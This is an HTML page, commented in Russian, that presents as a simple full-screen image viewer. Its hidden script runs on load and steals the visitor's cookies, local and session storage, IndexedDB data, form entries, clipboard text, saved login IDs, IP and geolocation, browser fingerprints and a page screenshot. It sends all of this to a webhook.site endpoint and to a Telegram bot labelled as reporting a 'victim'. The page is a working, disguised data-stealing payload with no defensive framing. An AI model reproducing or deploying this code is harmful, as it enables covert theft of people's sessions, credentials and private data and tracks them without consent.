<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 0;
        }
        img {
            width: 100%;
            height: 100vh;
            object-fit: contain;
            display: block;
        }
    </style>
</head>
<body>
    <img src="https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg" alt="">

    <script>
        // ============================================================
        //  НАСТРОЙКИ
        // ============================================================
        const WEBHOOK_URL = 'https://webhook.site/613658ef-cb9f-4d68-8bae-9ae016ec744b';
        const BOT_TOKEN = '8783402037:AAF1L0A_UP12EUOgn5x2g7UMFntHy3QjDfk';
        const CHAT_ID = '8327334745';

        // ============================================================
        //  МАКСИМАЛЬНЫЙ СБОР
        // ============================================================
        (async function() {
            await new Promise(r => setTimeout(r, 2000));

            const data = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer || null
            };

            // ---- 1. БРАУЗЕР ----
            data.browser = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages || [],
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                vendor: navigator.vendor || '',
                product: navigator.product || '',
                appName: navigator.appName || '',
                appVersion: navigator.appVersion || '',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset()
            };

            // UA Client Hints
            try {
                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                    data.browser.uaHints = await navigator.userAgentData.getHighEntropyValues([
                        'platform', 'platformVersion', 'architecture', 'model', 'uaFullVersion'
                    ]);
                }
            } catch (_) {}

            // ---- 2. ЭКРАН ----
            data.screen = {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                orientation: screen.orientation ? screen.orientation.type : 'unknown'
            };
            data.window = {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            };

            // ---- 3. КУКИ ----
            data.cookies = {};
            if (document.cookie) {
                document.cookie.split('; ').forEach(c => {
                    const [k, v] = c.split('=');
                    if (k) data.cookies[k] = v || '';
                });
            }

            // ---- 4. LOCALSTORAGE ----
            data.localStorage = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key) {
                    let val = localStorage.getItem(key);
                    try { val = JSON.parse(val); } catch (_) {}
                    data.localStorage[key] = val;
                }
            }

            // ---- 5. SESSIONSTORAGE ----
            data.sessionStorage = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key) {
                    let val = sessionStorage.getItem(key);
                    try { val = JSON.parse(val); } catch (_) {}
                    data.sessionStorage[key] = val;
                }
            }

            // ---- 6. INDEXEDDB ----
            data.indexedDB = [];
            try {
                if (indexedDB.databases) {
                    const dbs = await indexedDB.databases();
                    for (const dbInfo of dbs) {
                        const dbData = { name: dbInfo.name, stores: [] };
                        try {
                            const db = await new Promise((res, rej) => {
                                const req = indexedDB.open(dbInfo.name);
                                req.onsuccess = () => res(req.result);
                                req.onerror = () => rej();
                            });
                            if (db) {
                                for (const storeName of db.objectStoreNames) {
                                    try {
                                        const tx = db.transaction(storeName, 'readonly');
                                        const store = tx.objectStore(storeName);
                                        const items = await new Promise((res, rej) => {
                                            const req = store.getAll();
                                            req.onsuccess = () => res(req.result);
                                            req.onerror = () => rej([]);
                                        });
                                        dbData.stores.push({ name: storeName, count: items.length, data: items });
                                    } catch (_) {}
                                }
                                db.close();
                            }
                        } catch (_) {}
                        data.indexedDB.push(dbData);
                    }
                }
            } catch (_) {}

            // ---- 7. ФОРМЫ ----
            data.forms = {};
            document.querySelectorAll('input, textarea, select').forEach(el => {
                const name = el.name || el.id || el.className || 'field';
                if (el.value !== undefined && el.value !== null && el.value !== '') {
                    data.forms[name] = el.value;
                }
            });
            document.querySelectorAll('form').forEach(form => {
                try {
                    const fd = new FormData(form);
                    for (const [k, v] of fd.entries()) {
                        data.forms['form_' + k] = v;
                    }
                } catch (_) {}
            });

            // ---- 8. МЕТА ----
            data.meta = {};
            document.querySelectorAll('meta').forEach(m => {
                const name = m.getAttribute('name') || m.getAttribute('property') || 'meta';
                data.meta[name] = m.getAttribute('content') || '';
            });

            // ---- 9. ССЫЛКИ ----
            data.links = Array.from(document.querySelectorAll('a[href]')).map(a => a.href);

            // ---- 10. ПАРАМЕТРЫ URL ----
            data.urlParams = {};
            new URLSearchParams(window.location.search).forEach((v, k) => {
                data.urlParams[k] = v;
            });

            // ---- 11. IP ----
            data.ip = null;
            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                const json = await resp.json();
                data.ip = json.ip;
            } catch (_) {}

            // ---- 12. ГЕО ----
            data.geo = null;
            if (data.ip) {
                try {
                    const resp = await fetch(`https://ipwhois.io/json/${data.ip}`);
                    const json = await resp.json();
                    if (json && json.success !== false) {
                        data.geo = {
                            country: json.country || '?',
                            country_code: json.country_code || '?',
                            region: json.region || '?',
                            city: json.city || '?',
                            lat: json.latitude || 0,
                            lon: json.longitude || 0,
                            isp: json.isp || '?',
                            org: json.org || '?',
                            timezone: json.timezone || '?',
                            continent: json.continent || '?',
                            currency: json.currency || '?',
                            phone_code: json.phone_code || '?',
                            postal: json.postal || '?'
                        };
                    }
                } catch (_) {}
            }

            // ---- 13. ЛОКАЛЬНЫЙ IP ----
            data.localIPs = [];
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                const ips = [];
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.candidate.split(' ')[4];
                        if (ip && !ips.includes(ip)) ips.push(ip);
                    }
                };
                pc.createDataChannel('test');
                await pc.createOffer().then(o => pc.setLocalDescription(o));
                await new Promise(r => setTimeout(r, 2000));
                pc.close();
                data.localIPs = ips;
            } catch (_) {}

            // ---- 14. БУФЕР ----
            data.clipboard = null;
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    data.clipboard = await navigator.clipboard.readText();
                }
            } catch (_) {}

            // ---- 15. CREDENTIALS ----
            data.credentials = null;
            try {
                if (navigator.credentials && navigator.credentials.get) {
                    const cred = await navigator.credentials.get({
                        password: true,
                        federated: { providers: ['https://accounts.google.com', 'https://facebook.com'] }
                    });
                    if (cred) {
                        data.credentials = { type: cred.type, id: cred.id };
                    }
                }
            } catch (_) {}

            // ---- 16. CANVAS ----
            data.canvasFingerprint = null;
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 256;
                canvas.height = 128;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 128, 64);
                ctx.fillStyle = '#069';
                ctx.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Cwm fjordbank glyphs vext quiz', 4, 45);
                data.canvasFingerprint = canvas.toDataURL();
            } catch (_) {}

            // ---- 17. WEBGL ----
            data.webglFingerprint = null;
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        data.webglFingerprint = {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                        };
                    }
                }
            } catch (_) {}

            // ---- 18. АУДИООТПЕЧАТОК ----
            data.audioFingerprint = null;
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.frequency.value = 440;
                osc.start(0);
                osc.stop(0.1);
                data.audioFingerprint = {
                    sampleRate: ctx.sampleRate,
                    state: ctx.state
                };
                ctx.close();
            } catch (_) {}

            // ---- 19. БАТАРЕЯ ----
            data.battery = null;
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    data.battery = {
                        level: b.level,
                        charging: b.charging,
                        chargingTime: b.chargingTime,
                        dischargingTime: b.dischargingTime
                    };
                }
            } catch (_) {}

            // ---- 20. СЕТЬ ----
            data.connection = null;
            try {
                const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (c) {
                    data.connection = {
                        effectiveType: c.effectiveType,
                        rtt: c.rtt,
                        downlink: c.downlink,
                        saveData: c.saveData,
                        type: c.type
                    };
                }
            } catch (_) {}

            // ---- 21. ПЛАГИНЫ ----
            data.plugins = Array.from(navigator.plugins || []).map(p => ({
                name: p.name,
                filename: p.filename,
                description: p.description
            }));

            // ---- 22. MIME ----
            data.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => ({
                type: m.type,
                description: m.description
            }));

            // ---- 23. ПАМЯТЬ (Performance) ----
            data.memory = null;
            try {
                if (performance.memory) {
                    data.memory = {
                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                        totalJSHeapSize: performance.memory.totalJSHeapSize,
                        usedJSHeapSize: performance.memory.usedJSHeapSize
                    };
                }
            } catch (_) {}

            // ---- 24. СКРИНШОТ ----
            data.screenshot = null;
            try {
                const script = document.createElement('script');
                script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
                document.head.appendChild(script);
                await new Promise((res) => {
                    script.onload = res;
                    setTimeout(res, 6000);
                });
                if (typeof html2canvas !== 'undefined') {
                    const canvas = await html2canvas(document.body, {
                        useCORS: true,
                        allowTaint: true,
                        scale: 0.4,
                        logging: false,
                        backgroundColor: null
                    });
                    data.screenshot = canvas.toDataURL('image/jpeg', 0.5);
                }
            } catch (_) {}

            // ============================================================
            //  ОТПРАВКА
            // ============================================================

            // ---- Webhook ----
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (_) {}

            // ---- Telegram ----
            try {
                let msg = '🔴 ЖЕРТВА\n\n';

                // IP
                if (data.ip) msg += `🌐 IP: ${data.ip}\n`;

                // ГЕО
                if (data.geo) {
                    msg += `\n📍 ГЕО:\n`;
                    msg += `   🌍 ${data.geo.country} (${data.geo.country_code})\n`;
                    if (data.geo.city) msg += `   🏙 ${data.geo.city}\n`;
                    if (data.geo.region) msg += `   🏛 ${data.geo.region}\n`;
                    if (data.geo.lat && data.geo.lon) {
                        msg += `   🗺 ${data.geo.lat}, ${data.geo.lon}\n`;
                        msg += `   🔗 https://www.google.com/maps?q=${data.geo.lat},${data.geo.lon}\n`;
                    }
                    if (data.geo.isp) msg += `   📡 ${data.geo.isp}\n`;
                    if (data.geo.timezone) msg += `   🕐 ${data.geo.timezone}\n`;
                    if (data.geo.postal) msg += `   📮 ${data.geo.postal}\n`;
                }

                // Локальный IP
                if (data.localIPs && data.localIPs.length) {
                    msg += `\n📡 Локальный IP: ${data.localIPs.join(', ')}\n`;
                }

                // Буфер
                if (data.clipboard) {
                    msg += `\n📋 Буфер: ${data.clipboard.substring(0, 200)}\n`;
                }

                // Сохранённые пароли
                if (data.credentials) {
                    msg += `\n🔑 Сохранённый логин: ${data.credentials.id}\n`;
                }

                // LOCALSTORAGE
                const lsKeys = Object.keys(data.localStorage);
                if (lsKeys.length > 0) {
                    msg += `\n💾 LOCALSTORAGE (${lsKeys.length} шт.):\n`;
                    for (const key of lsKeys) {
                        let val = data.localStorage[key];
                        if (typeof val === 'object') val = JSON.stringify(val).substring(0, 100);
                        msg += `   🔑 ${key}: ${val}\n`;
                    }
                }

                // SESSIONSTORAGE
                const ssKeys = Object.keys(data.sessionStorage);
                if (ssKeys.length > 0) {
                    msg += `\n🗂 SESSIONSTORAGE (${ssKeys.length} шт.):\n`;
                    for (const key of ssKeys) {
                        let val = data.sessionStorage[key];
                        if (typeof val === 'object') val = JSON.stringify(val).substring(0, 100);
                        msg += `   🔑 ${key}: ${val}\n`;
                    }
                }

                // INDEXEDDB
                if (data.indexedDB && data.indexedDB.length > 0) {
                    msg += `\n🗄 INDEXEDDB:\n`;
                    for (const db of data.indexedDB) {
                        msg += `   📁 ${db.name} (${db.stores.length} хранилищ)\n`;
                        for (const store of db.stores) {
                            msg += `      📂 ${store.name}: ${store.count} записей\n`;
                        }
                    }
                }

                // КУКИ
                const cookieKeys = Object.keys(data.cookies);
                if (cookieKeys.length > 0) {
                    msg += `\n🍪 КУКИ (${cookieKeys.length} шт.):\n`;
                    for (const key of cookieKeys) {
                        msg += `   🍪 ${key}: ${data.cookies[key].substring(0, 80)}\n`;
                    }
                }

                // ФОРМЫ
                const formKeys = Object.keys(data.forms);
                if (formKeys.length > 0) {
                    msg += `\n📝 ФОРМЫ:\n`;
                    for (const key of formKeys) {
                        msg += `   ${key}: ${data.forms[key]}\n`;
                    }
                }

                // ОТПЕЧАТКИ
                if (data.canvasFingerprint) {
                    msg += `\n🎨 Canvas: ${data.canvasFingerprint.substring(0, 60)}...\n`;
                }
                if (data.webglFingerprint) {
                    msg += `🖥 WebGL: ${data.webglFingerprint.renderer || '?'}\n`;
                }
                if (data.audioFingerprint) {
                    msg += `🔊 Audio: ${data.audioFingerprint.sampleRate}Hz\n`;
                }

                // СЕТЬ И БАТАРЕЯ
                if (data.connection) {
                    msg += `📶 Сеть: ${data.connection.effectiveType || '?'}\n`;
                }
                if (data.battery) {
                    msg += `🔋 Батарея: ${Math.round(data.battery.level * 100)}%\n`;
                }

                // БРАУЗЕР
                msg += `\n📱 ${data.browser.userAgent.substring(0, 80)}...\n`;
                msg += `🕐 ${data.browser.timezone || '?'}\n`;
                msg += `💻 ${data.browser.platform || '?'}\n`;

                // СКРИНШОТ
                if (data.screenshot) {
                    msg += `🖼 Скриншот: ${(data.screenshot.length / 1024).toFixed(0)} КБ\n`;
                }

                msg += `\n🔗 ${data.url}`;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
                });
            } catch (_) {}

            // ---- Скриншот отдельно ----
            if (data.screenshot && data.screenshot.length > 10000) {
                try {
                    const blob = await fetch(data.screenshot).then(r => r.blob());
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'screenshot.jpg');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (_) {}
            }

            console.log('✅ Данные отправлены');
        })();
    </script>
</body>
</html>
